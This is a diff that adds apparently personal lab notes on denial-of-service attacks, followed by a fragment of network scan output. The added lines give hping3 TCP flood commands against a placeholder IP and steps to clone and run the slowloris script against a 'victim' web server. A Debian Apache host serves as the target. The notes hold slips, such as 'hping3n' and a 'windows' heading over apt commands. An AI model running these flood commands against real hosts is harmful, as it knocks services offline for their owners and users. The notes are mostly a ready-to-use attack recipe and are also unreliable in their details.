@@ -1,3 +1,26 @@
+1) DOS using TCP (using windows)
+sudo apt install hping3
+sudo hping3 -p 80 <IP> (Normal)
+sudo hping3n --flood -p 80 <IP> (with flood)
+
+1) DOS using TCP (using Linux)
+sudo apt install bpytop
+sudo apt install hping3
+sudo hping3 -p 80 <IP> (Normal)
+sudo hping3n --flood -p 80 <IP> (with flood)
+sudo bpytop
+
+
+2) slowloris(1deb,1kali)
+(kali)
+go to chrome ---> search (GitHub.com/gkbrk/slowloris) --> clone this repository
+cd slowloris
+sudo apt install python3
+sudo python3 slowloris.py -p 80 -s 250 <IP Victim>
+
+(deb)
+sudo apt install apache2
+ss -antp | grep 80 | wc
 HACK---1
 Currently scanning: Finished!   |   Screen View: Unique Hosts              
                                                                             
